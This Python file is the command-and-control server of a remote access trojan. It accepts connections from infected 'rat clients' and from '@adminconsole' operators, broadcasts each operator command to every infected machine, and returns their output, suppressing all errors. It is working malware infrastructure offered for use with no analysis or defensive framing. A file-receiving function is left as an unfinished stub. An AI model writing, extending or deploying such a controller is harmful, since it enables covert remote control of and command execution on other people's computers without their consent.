import contextlib
import socket
import threading
from colorama import Fore
import base64

PORT = 0
IP = "0.0.0.0"
FULLADDRESS = (IP, PORT)

ENCODING = 'utf-8'
HEADER = 99999

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(FULLADDRESS)

ratconnections = []
controlclients = []


def start():
    with contextlib.suppress(Exception):
        server.listen()
        print(f"{Fore.GREEN}[i] SERVER LISTENING ON {IP}:{PORT}")
        while True:
            connection, address = server.accept()
            clientinfo = connection.recv(HEADER).decode(ENCODING)
            print(f"{Fore.GREEN}[i] {clientinfo} HAS CONNECTED!")
            if "@adminconsole" in clientinfo:
                controlclients.append((connection, address))
            else:
                ratconnections.append((connection, address))


def sendtoall(message):
    with contextlib.suppress(Exception):
        output = ""
        for connection in ratconnections:
            try:
                connection[0].send(message.encode(ENCODING))
                output += connection[0].recv(HEADER).decode(ENCODING) + "\n"
            except ConnectionResetError:
                ratconnections.remove(connection)
                output += f"{Fore.RED}[!] Rat client {connection} is no longer online"

        return output if output != "" else f"{Fore.RED}[!] No rat clients are online"

def receivefile(message):
    with contextlib.suppress(Exception):
        print('kok')

if __name__ == "__main__":
    with contextlib.suppress(Exception):
        threading.Thread(target=start).start()
        while True:
            for client in controlclients:
                try:
                    command = client[0].recv(HEADER).decode(ENCODING)
                    print(f"{Fore.LIGHTWHITE_EX}[!] RECIEVED COMMAND {command}")
                    cmdout = sendtoall(command)
                    client[0].send(str(cmdout).encode(ENCODING))
                except ConnectionResetError:
                    controlclients.remove(client)
                    print(f"{Fore.RED}[!] Control client {client} has disconnected")
